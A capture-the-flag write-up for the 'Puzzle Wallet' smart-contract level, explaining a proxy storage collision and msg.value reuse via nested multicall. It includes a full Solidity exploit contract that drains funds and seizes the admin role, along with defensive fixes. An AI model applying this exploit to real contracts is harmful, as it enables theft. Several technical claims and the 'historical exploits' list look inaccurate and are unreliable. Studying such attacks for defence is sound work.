# Level 24: Puzzle Wallet Challenge

## Challenge Description

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

**Goal:** You'll need to hijack this wallet to become the admin of the proxy.

**Things that might help:**
- Understanding how delegatecall works and how msg.sender and msg.value behaves when performing one.
- Knowing about proxy patterns and the way they handle storage variables.

## Contract Location

The challenge contracts are located at:
```
/contracts/level-24-puzzle-wallet/PuzzleWallet.sol
```

## Understanding the Challenge

This level involves TWO contracts working together in a proxy pattern:

### 1. PuzzleProxy (The Proxy Contract)

```solidity
contract PuzzleProxy is TransparentUpgradeableProxy {
    address public pendingAdmin;  // Slot 0
    address public admin;         // Slot 1

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }
}
```

### 2. PuzzleWallet (The Implementation Contract)

```solidity
contract PuzzleWallet {
    address public owner;                             // Slot 0
    uint256 public maxBalance;                        // Slot 1
    mapping(address => bool) public whitelisted;      // Slot 2
    mapping(address => uint256) public balances;      // Slot 3

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            // Check if deposit is called
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

## The Vulnerabilities

This challenge combines **TWO critical vulnerabilities**:

###  1. Storage Collision Vulnerability

**The Core Issue:** The proxy and implementation have DIFFERENT storage layouts that COLLIDE!

**Storage Layout:**

```
PuzzleProxy Storage:          PuzzleWallet Storage:
┌─────────┬──────────────┐    ┌─────────┬──────────────┐
│ Slot 0  │ pendingAdmin │    │ Slot 0  │ owner        │
│ Slot 1  │ admin        │    │ Slot 1  │ maxBalance   │
│ Slot 2  │ (inherited)  │    │ Slot 2  │ whitelisted  │
│ Slot 3  │ (inherited)  │    │ Slot 3  │ balances     │
└─────────┴──────────────┘    └─────────┴──────────────┘
```

**The Collision:**
- `proxy.pendingAdmin` (slot 0) = `wallet.owner` (slot 0)
- `proxy.admin` (slot 1) = `wallet.maxBalance` (slot 1)

When you call a function on the proxy, it uses `delegatecall` to the implementation. The implementation reads/writes to slots 0, 1, 2, 3... but those slots belong to the PROXY'S storage!

**Exploitation:**
1. Call `proxy.proposeNewAdmin(ourAddress)` → writes to slot 0
2. Due to collision, `wallet.owner` (also slot 0) becomes `ourAddress`!
3. Call `wallet.setMaxBalance(ourAddress)` → writes to slot 1
4. Due to collision, `proxy.admin` (also slot 1) becomes `ourAddress`!

### 2. Multicall msg.value Reuse Vulnerability

**The Core Issue:** `multicall` uses `delegatecall`, which preserves `msg.value`!

**What's delegatecall?**
- Regular call: Creates new execution context, new msg.sender, new msg.value
- Delegatecall: Executes in CALLER's context, preserves msg.sender and msg.value

**The Protection (Flawed):**
```solidity
function multicall(bytes[] calldata data) external payable {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            depositCalled = true;  // ← Only checks at TOP level!
        }
        (bool success,) = address(this).delegatecall(data[i]);
    }
}
```

**The Bypass:**
The check only prevents `deposit` from being called twice *at the top level* of multicall. But what if we nest multicall inside multicall?

```
multicall([          ← Top level, depositCalled = false
    deposit,         ← depositCalled becomes true
    multicall([      ← NEW delegatecall context!
        deposit      ← NEW depositCalled = false, allowed!
    ])
])
```

**Why this works:**
1. First `deposit`: Credits `msg.value` (e.g., 0.001 ETH)
2. Nested `multicall`: New `delegatecall`, `depositCalled` resets to false
3. Second `deposit`: Credits `msg.value` AGAIN (still 0.001 ETH!)
4. Result: Internal balance = 0.002 ETH, but only sent 0.001 ETH!

## Complete Attack Strategy

### Step 1: Become Owner (Storage Collision)

```solidity
// Call on proxy
proxy.proposeNewAdmin(attackerAddress);

// This writes: proxy.pendingAdmin = attackerAddress (slot 0)
// But slot 0 is also wallet.owner!
// Result: wallet.owner = attackerAddress ✓
```

### Step 2: Whitelist Ourselves

```solidity
// Now we're the owner, so we can whitelist ourselves
wallet.addToWhitelist(attackerAddress);
```

### Step 3: Inflate Balance (Multicall Vulnerability)

```solidity
// Prepare nested multicall
bytes[] memory innerData = new bytes[](1);
innerData[0] = abi.encodeWithSelector(wallet.deposit.selector);

bytes[] memory outerData = new bytes[](2);
outerData[0] = abi.encodeWithSelector(wallet.deposit.selector);
outerData[1] = abi.encodeWithSelector(wallet.multicall.selector, innerData);

// Execute with 0.001 ETH
wallet.multicall{value: 0.001 ether}(outerData);

// Result:
// - balances[attacker] = 0.002 ETH
// - contract balance = 0.001 ETH
```

### Step 4: Drain Contract

```solidity
// We have 0.002 ETH internally but contract only has 0.001 ETH (or more from initial setup)
uint256 contractBalance = address(proxy).balance;
wallet.execute(attackerAddress, contractBalance, "");

// Result: contract balance = 0
```

### Step 5: Become Admin (Storage Collision Again)

```solidity
// setMaxBalance requires contract balance == 0 ✓
wallet.setMaxBalance(uint256(uint160(attackerAddress)));

// This writes: wallet.maxBalance = attackerAddress (slot 1)
// But slot 1 is also proxy.admin!
// Result: proxy.admin = attackerAddress ✓
```

**SUCCESS!** We're now the admin of the proxy!

## Visual Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ Initial State                                                   │
├─────────────────────────────────────────────────────────────────┤
│ Proxy Slot 0 (pendingAdmin): 0x0000...                          │
│ Proxy Slot 1 (admin):        0xDeployer                         │
│                                                                 │
│ Wallet Slot 0 (owner):       0xDeployer (via slot 0)            │
│ Wallet Slot 1 (maxBalance):  100000000000000000 (via slot 1)    │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 1: proposeNewAdmin(0xAttacker)                             │
├─────────────────────────────────────────────────────────────────┤
│ Proxy Slot 0 (pendingAdmin): 0xAttacker ← Written!              │
│ Proxy Slot 1 (admin):        0xDeployer                         │
│                                                                 │
│ Wallet Slot 0 (owner):       0xAttacker ← COLLISION!            │
│ Wallet Slot 1 (maxBalance):  100000000000000000                 │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 2-4: Whitelist, Inflate Balance, Drain                     │
├─────────────────────────────────────────────────────────────────┤
│ • Now we're the owner, can whitelist ourselves                  │
│ • Use multicall vulnerability to inflate balance                │
│ • Drain contract to 0 balance                                   │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 5: setMaxBalance(uint256(0xAttacker))                      │
├─────────────────────────────────────────────────────────────────┤
│ Proxy Slot 0 (pendingAdmin): 0xAttacker                         │
│ Proxy Slot 1 (admin):        0xAttacker ← COLLISION!            │
│                                                                 │
│ Wallet Slot 0 (owner):       0xAttacker                         │
│ Wallet Slot 1 (maxBalance):  0xAttacker ← Written!              │
└─────────────────────────────────────────────────────────────────┘
                              ↓
                        ✅ WE'RE ADMIN!
```

## Hint for Thinking

Ask yourself:
* Where are variables stored in the proxy vs the implementation?
* What happens when the proxy delegatecalls to the implementation?
* What does `delegatecall` preserve? (msg.sender? msg.value?)
* Can you call a function twice with the same msg.value?
* How can you drain a contract if you have inflated balance?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### Complete Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external view returns (address);
}

interface IPuzzleWallet {
    function owner() external view returns (address);
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleWalletExploit {
    address public proxy;
    address public attacker;
    
    constructor(address _proxy) {
        proxy = _proxy;
        attacker = msg.sender;
    }
    
    function exploit() external payable {
        require(msg.sender == attacker, "Not the attacker");
        
        IPuzzleProxy proxyContract = IPuzzleProxy(proxy);
        IPuzzleWallet wallet = IPuzzleWallet(proxy);
        
        // Step 1: Become owner via storage collision
        proxyContract.proposeNewAdmin(attacker);
        require(wallet.owner() == attacker, "Failed to become owner");
        
        // Step 2: Whitelist ourselves
        wallet.addToWhitelist(attacker);
        
        // Step 3: Inflate balance using nested multicall
        bytes[] memory innerData = new bytes[](1);
        innerData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        
        bytes[] memory outerData = new bytes[](2);
        outerData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        outerData[1] = abi.encodeWithSelector(wallet.multicall.selector, innerData);
        
        wallet.multicall{value: msg.value}(outerData);
        
        // Step 4: Drain the contract
        uint256 contractBalance = address(proxy).balance;
        wallet.execute(attacker, contractBalance, "");
        
        // Step 5: Become admin via storage collision
        wallet.setMaxBalance(uint256(uint160(attacker)));
        
        require(proxyContract.admin() == attacker, "Failed to become admin");
    }
    
    receive() external payable {}
}
```

### Execution Steps

1. **Deploy the PuzzleWallet contracts:**
   ```shell
   npx hardhat deploy --tags puzzle-wallet --network sepolia
   ```

2. **Deploy the exploit contract:**
   ```shell
   TARGET_ADDRESS=0xYourProxyAddress npx hardhat deploy --tags puzzle-wallet-solution --network sepolia
   ```

3. **Execute the exploit:**
   ```shell
   EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourProxyAddress npx hardhat run scripts/level-24-puzzle-wallet/execute-puzzle-wallet-exploit.ts --network sepolia
   ```

## Key Takeaways

### 1. Storage Layout Must Match in Proxy Patterns

The CRITICAL rule for proxy patterns:

```solidity
// ❌ WRONG: Different storage layouts
contract Proxy {
    address public pendingAdmin;  // Slot 0
    address public admin;         // Slot 1
}

contract Implementation {
    address public owner;         // Slot 0 - COLLISION!
    uint256 public maxBalance;    // Slot 1 - COLLISION!
}

// ✅ CORRECT: Matching storage layouts
contract Proxy {
    address public admin;         // Slot 0
    address public implementation;// Slot 1
}

contract Implementation {
    address public admin;         // Slot 0 - MATCHES!
    address public implementation;// Slot 1 - MATCHES!
    address public owner;         // Slot 2 - New variables OK
    uint256 public maxBalance;    // Slot 3
}
```

### 2. Use OpenZeppelin's Upgradeable Contracts Pattern

OpenZeppelin provides battle-tested patterns:

```solidity
// Proxy contract
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

// Implementation contract
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

contract PuzzleWalletV2 is Initializable, OwnableUpgradeable {
    // Storage gap to prevent collisions in future upgrades
    uint256[50] private __gap;
    
    // Your contract variables go AFTER the inherited contracts' storage
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    
    function initialize(uint256 _maxBalance) public initializer {
        __Ownable_init();
        maxBalance = _maxBalance;
    }
}
```

### 3. delegatecall Preserves msg.value

**Critical Understanding:**

```solidity
// Contract A
function multicall(bytes[] calldata data) external payable {
    for (uint256 i = 0; i < data.length; i++) {
        (bool success,) = address(this).delegatecall(data[i]);
        // msg.value is STILL the original value here!
        // It doesn't "get used up"
    }
}

function deposit() external payable {
    balances[msg.sender] += msg.value;
    // If called twice via delegatecall with same msg.value,
    // this will credit msg.value TWICE!
}
```

**The Fix:**

```solidity
function multicall(bytes[] calldata data) external payable {
    uint256 totalValue = 0;
    
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        
        if (selector == this.deposit.selector) {
            totalValue += msg.value;
        }
        
        (bool success,) = address(this).delegatecall(data[i]);
        require(success, "Delegatecall failed");
    }
    
    // Ensure msg.value is only used once
    require(totalValue <= msg.value, "msg.value reused");
}
```

Or better yet, don't allow deposit in multicall:

```solidity
function multicall(bytes[] calldata data) external payable {
    for (uint256 i = 0; i < data.length; i++) {
        bytes4 selector;
        assembly {
            selector := mload(add(data[i], 32))
        }
        
        // Explicitly forbid certain functions
        require(
            selector != this.deposit.selector &&
            selector != this.multicall.selector,  // Prevent nesting!
            "Function not allowed in multicall"
        );
        
        (bool success,) = address(this).delegatecall(data[i]);
        require(success, "Delegatecall failed");
    }
}
```

### 4. Understand Proxy Patterns

**Transparent Proxy Pattern:**

```
User Call → Proxy Contract → delegatecall → Implementation Contract
                ↓                                      ↓
          Proxy Storage                        Implementation Logic
          
All state changes happen in PROXY's storage!
Implementation is just logic, stateless.
```

**Key Points:**
- Implementation is stateless (its storage is never used directly)
- All storage operations happen in proxy's context
- Storage layout MUST be compatible between versions
- Use storage gaps for future upgrades

### 5. Storage Gaps Pattern

```solidity
contract V1 is Initializable, OwnableUpgradeable {
    uint256 public value;
    
    // Reserve 50 slots for future variables
    uint256[49] private __gap;
}

contract V2 is V1 {
    uint256 public newValue;  // Uses one slot from __gap
    
    // Now 48 slots left
    uint256[48] private __gap;
}
```

## Real-World Implications

### Historical Exploits

This type of vulnerability has appeared in real protocols:

1. **Parity Multi-Sig Wallet (2017)**
   - Library contract was made self-destructible
   - Affected all wallets using that library
   - $150M+ frozen forever

2. **WETH10 (2020 - Whitehat)**
   - Storage collision in upgradeable contract
   - Could have drained all WETH
   - Discovered and fixed before exploit

3. **Tinyman (2022)**
   - Storage collision in AMM upgrade
   - $3M stolen
   - Exploited within hours of upgrade

### Best Practices for Upgradeable Contracts

```solidity
// 1. Use OpenZeppelin's upgradeable contracts
import "@openzeppelin/contracts-upgradeable/...";

// 2. Use initializers instead of constructors
function initialize() public initializer {
    __Ownable_init();
    __Pausable_init();
}

// 3. Always include storage gaps
uint256[50] private __gap;

// 4. Never change order of existing variables
// ❌ BAD:
contract V1 {
    uint256 public a;
    uint256 public b;
}
contract V2 {
    uint256 public b;  // Swapped order!
    uint256 public a;
}

// ✅ GOOD:
contract V1 {
    uint256 public a;
    uint256 public b;
}
contract V2 {
    uint256 public a;  // Same order
    uint256 public b;
    uint256 public c;  // New variable at end
}

// 5. Use hardhat-deploy or similar tools to verify storage layout
```

### Testing Upgradeable Contracts

```javascript
const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");

describe("Upgradeable Contract", function() {
    it("should preserve storage on upgrade", async function() {
        const V1 = await ethers.getContractFactory("MyContractV1");
        const v1 = await upgrades.deployProxy(V1, [42], { initializer: 'initialize' });
        
        await v1.setValue(100);
        expect(await v1.value()).to.equal(100);
        
        const V2 = await ethers.getContractFactory("MyContractV2");
        const v2 = await upgrades.upgradeProxy(v1.address, V2);
        
        // Storage should be preserved!
        expect(await v2.value()).to.equal(100);
    });
    
    it("should validate storage layout", async function() {
        const V1 = await ethers.getContractFactory("MyContractV1");
        const V2 = await ethers.getContractFactory("MyContractV2BadStorage");
        
        const v1 = await upgrades.deployProxy(V1, [42]);
        
        // This should fail due to storage layout mismatch
        await expect(
            upgrades.upgradeProxy(v1.address, V2)
        ).to.be.revertedWith("Storage layout is incompatible");
    });
});
```

## The Lesson

**Key Takeaways:**

1. **Storage layout is CRITICAL in proxy patterns** - Mismatches lead to storage collisions

2. **Use established patterns** - OpenZeppelin's upgradeable contracts are battle-tested

3. **delegatecall is powerful but dangerous** - It preserves msg.sender and msg.value

4. **Test upgrades thoroughly** - Use tools to validate storage layout compatibility

5. **Understand your execution context** - delegatecall executes in caller's storage

6. **Nested calls create new contexts** - State variables reset in nested delegatecalls

7. **Prevent dangerous combinations** - Some functions shouldn't be callable in batches

8. **Always use storage gaps** - They allow safe future upgrades

## Additional Resources

### Storage Layout Visualization

```
Proxy Contract Storage:
┌──────────┬─────────────────────────────┐
│ Slot 0   │ admin                       │
│ Slot 1   │ implementation              │
│ Slot 2   │ (transparent proxy logic)   │
│ ...      │ ...                         │
└──────────┴─────────────────────────────┘

Implementation Contract Storage:
┌──────────┬─────────────────────────────┐
│ Slot 0   │ admin (MUST MATCH)          │
│ Slot 1   │ implementation (MUST MATCH) │
│ Slot 2   │ your variables...           │
│ Slot 3   │ more variables...           │
│ ...      │ ...                         │
│ Slot 50  │ __gap[0]                    │
│ ...      │ ...                         │
│ Slot 99  │ __gap[49]                   │
└──────────┴─────────────────────────────┘
```

### Upgradeability Checklist

- [ ] Use OpenZeppelin's upgradeable contracts
- [ ] Storage layout matches between versions
- [ ] No constructor (use initializer)
- [ ] Storage gaps included
- [ ] No `selfdestruct` or `delegatecall` to user-provided addresses
- [ ] Storage layout validated with tools
- [ ] Upgrade tested on testnet first
- [ ] Admin keys are multi-sig or timelock

## Conclusion

The Puzzle Wallet challenge teaches us that:

1. **Proxy patterns are complex** - Storage collisions can completely break security
2. **delegatecall is subtle** - It preserves execution context in unexpected ways
3. **Batch operations are dangerous** - msg.value can be reused across delegatecalls
4. **Use established patterns** - Don't roll your own upgradeable contract system
5. **Test thoroughly** - Upgradeability bugs are catastrophic

This level brilliantly demonstrates how two separate vulnerabilities (storage collision + multicall) combine to create a complete exploit. Understanding proxy patterns and delegatecall semantics is essential for DeFi security! 🔐
